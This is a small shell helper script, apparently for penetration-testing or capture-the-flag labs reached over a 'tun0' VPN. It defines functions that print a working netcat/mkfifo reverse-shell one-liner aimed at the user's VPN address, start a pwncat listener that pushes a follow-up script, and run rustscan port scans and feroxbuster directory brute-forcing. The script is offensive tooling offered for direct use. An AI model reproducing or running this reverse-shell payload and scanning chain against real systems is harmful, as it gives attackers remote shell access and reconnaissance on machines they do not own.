#!/bin/sh

_VPN="tun0"
_HAKDIR=$(readlink -f "$(dirname "$0")")

tunip() {
  if i=$(ip addr show dev "$_VPN" 2>/dev/null); then
    echo "$i" | awk '/inet / {print $2}' | awk -F / '{print $1}'
  else
    echo "$@"
  fi
}

rev() {
  ip=$(tunip "0.0.0.0")
  port="${1:=1337}"
  echo "rm /tmp/p;mkfifo /tmp/p;nc ${ip} ${port} 0</tmp/p|/bin/sh > /tmp/p 2>&1;rm /tmp/p"
  echo "https://revshells.com/#ip=${ip}&port=${port}"
  # shellcheck disable=SC2068,SC3057
  command pwncat --script-send "$_HAKDIR/pwnse.py" -vv -l "$ip" "$port"
}

scan() {
  # shellcheck disable=SC2068,SC3057
  command rustscan ${@:2} --accessible -a $1 -- -A | tee "scan-$(date +%F-%T)"
}

ferox() {
  wordlist="${2:=/usr/share/seclists/Discovery/Web-Content/common.txt}"
  # shellcheck disable=SC2068,SC3057
  command feroxbuster -rw "$wordlist" -o "ferox-$(date +%F-%T)" -u "$1" ${@:2}
}

PS1="(\$(tunip \"No vpn\"))${PS1}"

printf "\033[1;32m\033[40mUseful sources for hak\033[0m: "
tunip "Not connected to a vpn!"
